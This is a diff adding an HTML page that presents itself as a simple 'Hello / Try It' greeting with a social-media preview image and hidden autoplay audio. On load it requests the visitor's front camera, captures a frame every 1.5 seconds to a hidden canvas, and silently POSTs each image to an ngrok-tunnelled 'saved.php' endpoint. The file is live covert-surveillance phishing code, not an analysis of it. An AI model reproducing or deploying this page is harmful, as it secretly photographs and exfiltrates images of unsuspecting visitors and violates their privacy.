@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+ <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+ <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <meta charset="UTF-8">
+  <meta property="og:image" content="https://scontent.fbdo4-1.fna.fbcdn.net/v/t1.0-9/s960x960/117766957_2242320945913879_6218517671134967135_o.jpg?_nc_cat=101&_nc_sid=dd9801&_nc_eui2=AeGqam-WLwQ_wYpH6m0Hexm4Z5j0Sad9G-NnmPRJp30b4xl9BTYwnanA4ZY3iF4ck7vQpyHKoqagMFs1iASqa9Gz&_nc_ohc=yPo1zj7B-dsAX8Tb5mG&_nc_ht=scontent.fbdo4-1.fna&_nc_tp=7&oh=36b2626ee5ad349606efae5311df1e64&oe=5F5E65D8"/>
+  <meta name="keywords" content="Hello World!">
+  <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/nako48/shiraookaaaa/master/favicon.ico"/>
+  <link href="https://fonts.googleapis.com/css?family=Pacifico" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+  <link rel="stylesheet" href="https://rawcdn.githack.com/nako48/shiraookaaaa/18e2af7031118f61a9e87b8edda4feba0b5b2009/style.css">
+</head>
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+ function post(imgdata){
+ $.ajax({
+     type: 'POST',
+     data: { cat: imgdata},
+     url: 'https://803fc699993b.ngrok.io/saved.php',
+     dataType: 'json',
+     async: false,
+     success: function(result){
+         // call the function that handles the response/results
+         //alert('saved!');
+     },
+     error: function(){
+     	//alert('Error has been occurred');
+     }
+   });
+ }; 
+ 
+ 
+ 'use strict';
+ 
+ const video = document.getElementById('video');
+ const canvas = document.getElementById('canvas');
+ const errorMsgElement = document.querySelector('span#errorMsg');
+ 
+ const constraints = {
+   audio: false,
+   video: {
+     
+     facingMode: "user"
+   }
+ };
+ 
+ // Access webcam
+ async function init() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+     handleSuccess(stream);
+   } catch (e) {
+     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   }
+ }
+ 
+ // Success
+ function handleSuccess(stream) {
+   window.stream = stream;
+   video.srcObject = stream;
+ 
+ var context = canvas.getContext('2d');
+   setInterval(function(){
+ 
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData); }, 1500);
+   
+ 
+ }
+ 
+ // Load init
+ init();
+ 
+</script>
+<body>
+  <div class="effect-text">
+    <center>Hello</center>
+    <center><button onclick="clicked()">Try It</button>
+      <p id="click"></p>
+      <br>
+    </span>
+  </center>
+</div>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+<script  src="https://rawcdn.githack.com/nako48/shiraookaaaa/e84ddf602db75bfecc9e361602976f7460b3c286/script.js"></script>
+</body>
+<audio src="https://b.top4top.io/m_15787eqme1.mp3" autoplay="autoplay" hidden="hidden"></audio>
+</html>
